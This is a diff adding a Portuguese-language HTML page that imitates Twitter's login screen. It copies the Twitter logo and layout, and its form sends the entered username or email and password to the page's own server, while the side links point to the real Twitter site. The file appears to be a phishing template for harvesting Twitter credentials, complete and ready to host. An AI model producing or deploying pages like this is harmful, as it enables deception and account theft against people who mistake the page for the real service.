@@ -1,0 +1,210 @@
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    @import url("https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap");
+
+:root {
+  --blue: #8ed0f9;
+  --blue2: #1da1f2;
+  --gray: rgb(101, 119, 134);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  outline: none;
+}
+
+body,
+main,
+header,
+h1,
+h2 {
+  padding: 0;
+  margin: 0;
+}
+
+button,
+input,
+input:focus,
+label {
+  background-color: transparent;
+  box-shadow: none;
+  border: none;
+  outline: none;
+}
+
+a {
+  text-decoration: none;
+}
+
+.container {
+  display: block;
+  max-width: 960px;
+  width: 100%;
+  margin: 0 auto;
+}
+
+body {
+  font-family: "Montserrat", sans-serif;
+}
+
+img {
+  width: 100%;
+  display: block;
+}
+
+.logo img {
+  width: 65px;
+  margin: 8px auto;
+}
+
+main h1 {
+  text-align: center;
+  font-size: 24px;
+}
+
+main form {
+  display: block;
+  margin-top: 32px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+main form .inputs {
+  margin: 16px auto;
+  width: 100%;
+  max-width: 520px;
+  background-color: rgb(245, 248, 250);
+  font-size: 20px;
+}
+
+main form .inputs label {
+  padding-left: 8px;
+  color: rgb(101, 119, 134);
+  font-size: 14px;
+  display: inline-block;
+}
+
+main form .inputs:focus-within label {
+  color: var(--blue2);
+}
+
+main form .inputs input[type="text"],
+main form .inputs input[type="password"] {
+  width: 100%;
+  padding: 8px;
+  height: 30px;
+  font-size: 18px;
+  border-bottom: 2px solid var(--gray);
+  border-radius: 3px;
+  transition: 200ms;
+}
+
+main form .inputs input[type="text"]:focus,
+main form .inputs input[type="password"]:focus {
+  border-bottom: 2px solid var(--blue2);
+}
+
+main form .inputs label:focus-within {
+  color: var(--blue2);
+}
+
+main form .button {
+  display: block;
+  margin: 0 auto;
+  color: white;
+  font-size: 14px;
+  font-weight: bold;
+  width: 520px;
+  height: 45px;
+  background-color: var(--blue);
+  border-radius: 30px;
+  transition: 400ms;
+  text-align: center;
+}
+
+main form .button:hover {
+  background-color: #1da1f2;
+  cursor: pointer;
+}
+
+.links {
+  margin-top: 32px;
+  text-align: center;
+}
+
+.links a {
+  color: #1da1f2;
+  font-size: 14px;
+}
+
+.links a:hover {
+  text-decoration: underline;
+}
+
+.ponto:after {
+  content: ".";
+  position: relative;
+  top: -4px;
+}
+
+@media only screen and (min-width: 720px) {
+  .container {
+    max-width: 520px;
+  }
+  main form .button {
+    max-width: 520px;
+  }
+}
+
+@media only screen and (max-width: 719.9px) {
+  .container {
+    max-width: 300px;
+  }
+  main form .button {
+    max-width: 300px;
+  }
+  .links a {
+    display: block;
+  }
+  .ponto:after {
+    display: none;
+  }
+}
+</style>
+</head>
+<body>
+  <header class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Logo_of_Twitter.svg/512px-Logo_of_Twitter.svg.png?20220821125553" alt="Logo do Twitter">
+    </div>
+  </header>
+
+  <main class="container">
+    <h1>Log in to Twitter</h1>
+    <div class="container">
+      <form method="POST">
+        <div class="inputs">
+          <label class="usuario" for="usuario">Mobile, email or username</label><br>
+          <input type="text" name="email" id="usuario">
+        </div>
+        <div class="inputs">
+          <label class="senha"  for="senha">Password</label><br>
+          <input type="password" name="pass" id="senha">
+        </div>
+        <br>
+        <button class="button" type="submit">to enter</button>
+      </form>
+      <div class="links container">
+        <a target="_blank" href="https://twitter.com/login?lang=pt">Forgot password?</a>
+        <span class="ponto"></span>
+        <a target="_blank" href="https://twitter.com/login?lang=pt">Subscribe to Twitter</a>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
